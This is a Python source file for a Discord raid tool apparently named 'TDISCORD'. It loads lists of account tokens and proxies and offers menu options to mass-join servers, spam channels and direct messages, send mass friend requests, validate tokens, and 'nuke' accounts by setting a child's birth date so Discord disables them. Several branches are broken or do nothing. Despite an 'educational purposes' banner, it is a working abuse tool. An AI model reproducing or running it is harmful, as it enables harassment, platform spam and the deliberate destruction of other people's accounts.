#imports
import os
import sys
import threading
from threading import Thread
import colorama
from colorama import Fore, Back, Style
import time
import json
import requests
import ctypes
import discord
import random
import urllib3
urllib3.disable_warnings()

colorama.init()

def main():
    os.system('cls')
    req = requests.Session()
    ctypes.windll.kernel32.SetConsoleTitleW("LOADING!...")
    try:
        if requests.get('https://google.com').ok:
            pass
    except:
        print(Fore.RED + "You Are Not Connected To The Internet!")
        input("Press Enter To Retry!")
        os.system('cls')
        main()
    try:
        f = open('proxy.txt', 'r')
        global proxylen
        proxylen = len(f.readlines())
    except:
        print(f"{Fore.RED}Cannot Find proxy.txt! {Fore.WHITE}Please Make Sure There Is A File Called proxy.txt with proxies in path!")
        input("Press Enter To Restart Program")
        os.system('cls')
        main()
    
    try:
        k = open('token.txt', 'r')
        global tokenlen
        tokenlen = len(k.readlines())
    except:
        print(f"{Fore.RED}Cannot Find token.txt! {Fore.WHITE}Please Make Sure There Is A File Called token.txt with proxies in path!")
        input("Press Enter To Restart Program")
        os.system('cls')
        main()
    
    proxies = open('proxy.txt','r').read().splitlines()
    proxies = [{'https':'http://'+proxy} for proxy in proxies]
    tokens = open('token.txt','r').read().splitlines()

    ctypes.windll.kernel32.SetConsoleTitleW(f"TDISCORD - MADE BY TOG6 WITH <3 | Proxies -> {proxylen} | Tokens -> {tokenlen}")
    print(f"""
                    {Fore.RED}████████╗  {Fore.WHITE}██████╗░██╗░██████╗░█████╗░░█████╗░██████╗░██████╗░
                    {Fore.RED}╚══██╔══╝  {Fore.WHITE}██╔══██╗██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗
                    {Fore.RED}░░░██║░░░  {Fore.WHITE}██║░░██║██║╚█████╗░██║░░╚═╝██║░░██║██████╔╝██║░░██║
                    {Fore.RED}░░░██║░░░  {Fore.WHITE}██║░░██║██║░╚═══██╗██║░░██╗██║░░██║██╔══██╗██║░░██║
                    {Fore.RED}░░░██║░░░  {Fore.WHITE}██████╔╝██║██████╔╝╚█████╔╝╚█████╔╝██║░░██║██████╔╝
                    {Fore.RED}░░░╚═╝░░░  {Fore.WHITE}╚═════╝░╚═╝╚═════╝░░╚════╝░░╚════╝░╚═╝░░╚═╝╚═════╝░

{Fore.YELLOW}Welcome To The Best DISCORD TOOL! PROGRAM IS MADE ONLY FOR UNDERSTANDING AN EDUCATIONAL PURPOSES!
{Fore.YELLOW}Please Do Not Use This Tool To Raid Someone As Discord Is Much More Advance Than You Think!
{Fore.YELLOW}It Wont Take Discord More Than A Minute To Block Your HWID And IP!

                    {Fore.CYAN}Number Of Proxies In proxy.txt - {Fore.WHITE}{proxylen}
                    {Fore.CYAN}Number Of Tokens In token.txt - {Fore.WHITE}{tokenlen}
        
        {Fore.CYAN}[1] - {Fore.WHITE}Join A Discord Server with {tokenlen} Accounts! 
        {Fore.CYAN}[2] - {Fore.WHITE}Leave A Discord Server With {tokenlen} Accounts!
        {Fore.CYAN}[3] - {Fore.WHITE}Spam A Discord Server's Channel With {tokenlen} Accounts!
        {Fore.CYAN}[4] - {Fore.WHITE}Spam A Discord Server's Channel With Photos With {tokenlen} Accounts!
        {Fore.CYAN}[5] - {Fore.WHITE}Send A Friend Request To User With {tokenlen} Accounts!
        {Fore.CYAN}[6] - {Fore.WHITE}DM A User With {tokenlen} Accounts!
        {Fore.CYAN}[7] - {Fore.WHITE}Check {tokenlen} Tokens For Validity!
        {Fore.CYAN}[8] - {Fore.WHITE}Change All {tokenlen} Account's Discord Status!
        {Fore.CYAN}[9] - {Fore.WHITE}Change All {tokenlen} Account's Profile Picture!
        {Fore.CYAN}[10]- {Fore.WHITE}Check {proxylen} Proxies!
        {Fore.CYAN}[11]- {Fore.WHITE}Get More Proxies!
        {Fore.CYAN}[12]- {Fore.WHITE}Destroy {tokenlen} Tokens!

        {Fore.RED}[C] - Clear The Console! 
""")

    ctypes.windll.kernel32.SetConsoleTitleW("Choose Your Option!")
    print(Fore.MAGENTA + "")
    bruh = str(input("[?] - "))

    if bruh == '1':
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("Chose Option 1!")
        print(Fore.YELLOW + " ")
        lk = str(input("Enter The Discord Server To Join [Ex: Qxesgwrg]: "))
        ctypes.windll.kernel32.SetConsoleTitleW(f"Starting Process -> Server Joiner | Joining -> {lk}")
        print(f"{Fore.GREEN}Starting Process -> Server Joiner | Joining -> {lk}")
        poscount = 0
        negcount = 0
        for token in tokens:
            try:
                proxy = random.choice(proxies)
                r = req.post(f'https://discord.com/api/v6/invite/{lk}', headers = {'Authorization': token}, proxies = proxy)
                print(Fore.GREEN + f"Successfully Joined {lk} with {token}")
                poscount += 1
                ctypes.windll.kernel32.SetConsoleTitleW(f"[+] -> {int(poscount)} | [-] -> {int(negcount)}")
            except:
                print(Fore.RED + f"An Error Occured! - Couldn't Join {lk} With {token}")
                negcount += 1
                ctypes.windll.kernel32.SetConsoleTitleW(f"[+] -> {int(poscount)} | [-] -> {int(negcount)}")
        print(Fore.GREEN + "DONE!")
        time.sleep(2)
        os.system('cls')
        main()

    elif bruh == '2':
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("Chose Option 2!")
        lk = int(input("Enter The Server ID: "))
        poscount = 0
        negcount = 0
        for token in tokens:
            try:
                headers = {'Authorization': token}
                requests.delete(f'https://discord.com/api/v6/users/@me/guilds/{lk}', headers=headers)
                print(Fore.GREEN + f"Successfully Left {lk} with {token}")
                poscount += 1
                ctypes.windll.kernel32.SetConsoleTitleW(f"[+] -> {int(poscount)} | [-] -> {int(negcount)}")
            except:
                print(Fore.RED + f"An Error Occured! - Couldn't Leave {lk} With {token}")
                negcount += 1
                ctypes.windll.kernel32.SetConsoleTitleW(f"[+] -> {int(poscount)} | [-] -> {int(negcount)}")
        print(Fore.GREEN + "Process Done!")
        time.sleep(2)
        os.system('cls')
        main()

    elif bruh == '3':
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("Chose Option 3!")
        n = input("Enter The Message To Spam: ")
        s = int(input("How Many Times Do You Want To Spam?: "))
        k = int(input("Enter The Channel ID: "))
        count = 0
        print(Fore.GREEN + "Starting Process!")
        for token in tokens:
            for i in range(s):
                try:
                    proxy = random.choice(proxies)
                    r = req.post(f'https://discordapp.com/api/v6/channels/{k}/messages', headers = {'Authorization': token}, json = {'content': n,'nonce':'','tts':False}, proxies = proxy)
                    count += 1
                    ctypes.windll.kernel32.SetConsoleTitleW(f"Spammed Channel {count} times!")
                except:
                    pass
        print(Fore.GREEN + "Process Over!")
        time.sleep(2)
        os.system('cls')
        main()

    elif bruh == '4':
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("Chose Option 4!")
        n = input("Enter The Path To The Photo To Spam: ")
        f = open(n, 'rb')
        s = int(input("How Many Times Do You Want To Spam?: "))
        k = int(input("Enter The Channel ID: "))
        count = 0
        print(Fore.GREEN + "Starting Process!")
        for token in tokens:
            for i in range(s):
                try:
                    proxy = random.choice(proxies)
                    r = req.post(f'https://discordapp.com/api/v6/channels/{f}/messages', headers = {'Authorization': token}, json = {'content': n,'nonce':'','tts':False}, proxies = proxy)
                    count += 1
                    ctypes.windll.kernel32.SetConsoleTitleW(f"Spammed Channel {count} times!")
                except:
                    pass
        print(Fore.GREEN + "Process Over!")
        time.sleep(2)
        os.system('cls')
        main()
    
    elif bruh == '5':
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("Chose Option 5!")
        n = input("Enter The Friends Username#ID: ")
        count = 0
        print(Fore.GREEN + "Starting Process!")
        tartag = n.split('#')
        name = tartag[0]
        count = 0
        discrim = tartag[1]
        print(name,discrim)
        for token in tokens:
            try:
                proxy = random.choice(proxies)
                r = req.post(Fore.GREEN + f'https://discordapp.com/api/v6/users/@me/relationships', headers = {'Authorization': token}, json = {'username':name,'discriminator':discrim}, proxies = proxy)
                print(f"Friended {n} with {token}")
                count += 1
                ctypes.windll.kernel32.SetConsoleTitleW(f"Spam Friended {count} times!")
            except Exception as e:
                print(Fore.RED + f"Couldn't Send Friend Request To {n} With {token} | Because {e}")
        print(Fore.GREEN + "Process Over!")
        time.sleep(2)
        os.system('cls')
        main()

    elif bruh == '6':
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("Chose Option 6!")
        n = int(input("Enter The Friends ID: "))
        k = int(input("Enter The Amount: "))
        sv = input("Enter The Message: ")
        count = 0
        print(Fore.GREEN + "Starting Process!")
        for token in tokens:
            for i in range (k):
                try:
                    proxy = random.choice(proxies)
                    r = req.post(f'https://discordapp.com/api/v6/users/@me/channels', headers = {'Authorization': token}, json = {'recipient_id':n}, proxies = proxy).json()
                    r2 = req.post(f"https://discordapp.com/api/v6/channels/{r['id']}/messages", headers = {'Authorization': token}, json = {'content': sv,'nonce':'','tts':False}, proxies = proxy)
                    count += 1
                    ctypes.windll.kernel32.SetConsoleTitleW(f"Spammed Friend {count} times!")
                except:
                    pass
        print(Fore.GREEN + "Process Over!")
        time.sleep(2)
        os.system('cls')
        main()

    elif bruh == '7':
        os.system('cls')
        for token in tokens:
            proxy = random.choice(proxies)
            r = req.get(f'https://discord.com/api/v6/users/@me', headers = {'authorization':token}, proxies = proxy)
            if r.status_code == 200:
                print(f"{Fore.GREEN}{token} IS VALID!")
            else:
                print(f'{Fore.RED}{token} IS INVALID!')
        print(Fore.GREEN + "Process Over!")
        time.sleep(3)
        os.system('cls')
        main()

    elif bruh == '8':
        os.system('cls')
        lk = input("Enter The Status: ")
        for token in tokens:
            x = 5
        print(Fore.GREEN + "Done!")
        time.sleep(2)
        os.system('cls')
        main()

    elif bruh == '9':
        os.system('cls')
        print(Fore.RED + "Under Maintanence, Sorry!")
        time.sleep(3)
        os.system('cls')
        main()

    elif bruh == '10':
        os.system('cls')
        for proxy in proxies:
            try:
                Req = requests.get("https://ipinfo.io/" + proxy)
                if ('    "message": "Please provide a valid IP address"') in Req.text:
                    print(f"{Fore.RED}{proxy} Is Offline")
                else:
                    print(f"{Fore.GREEN}{proxy} Is Online!")
            except:
                print(Fore.RED + "ERROR ON YOUR END!")
        print(Fore.GREEN + "Done!")
        input("Press Any Key To Continue!")
        os.system('cls')
        main()

    elif bruh == '11':
        print(f"[{Fore.GREEN}+{Fore.RESET}] Scraping proxies...")
        try:
            res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1500')
            file = open("proxy.txt", "a+")
            file.seek(0)
            file.truncate()
            proxies = []
            for proxy in res.text.split('\n'):
                proxy = proxy.strip()
                if proxy:
                    proxies.append(proxy)
            for p in proxies:
                file.write((p)+"\n")
            file.close()
            print(f"[{Fore.GREEN}+{Fore.RESET}] Finished!")
        except Exception as e:
            print(f"{Fore.YELLOW}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        time.sleep(2)
        os.system('cls')
        main()

    elif bruh == '12':
        print("""
        [1] Single Account
        [2] All Accounts
        """)
        k = int(input("[?]: "))
        if k == 1:
            headers = {'Authorization': token}
            print(f"[{Fore.RED}+{Fore.RESET}] Nuking...")

            r = requests.patch('https://discordapp.com/api/v6/users/@me', headers={'Authorization': token}, json={'date_of_birth': '2015-7-16'})
            if r.status_code == 400:
                print(f'[{Fore.RED}+{Fore.RESET}] Account disabled successfully')
                input("Press any key to exit...")
            else:
                print(f'[{Fore.RED}-{Fore.RESET}] Invalid token')
        
        elif k == 2:
            for token in tokens:
                headers = {'Authorization': token}
                print(f"[{Fore.RED}+{Fore.RESET}] Nuking...")

                r = requests.patch('https://discordapp.com/api/v6/users/@me', headers={'Authorization': token}, json={'date_of_birth': '2015-7-16'})
                if r.status_code == 400:
                    print(f'[{Fore.RED}+{Fore.RESET}] Account disabled successfully')
                else:
                    print(f'[{Fore.RED}-{Fore.RESET}] Invalid token')

            time.sleep(2)
            main()
                
        else:
            print(Fore.RED + "INVALID CHOICE!")
            time.sleep(2)
            main


    elif bruh == 'C':
        os.system('cls')
        main()

    elif bruh == 'c':
        os.system('cls')
        main()

    else:
        print(Fore.RED + "Invalid Choice!")
        time.sleep(2)
        os.system('cls')
        main()

main()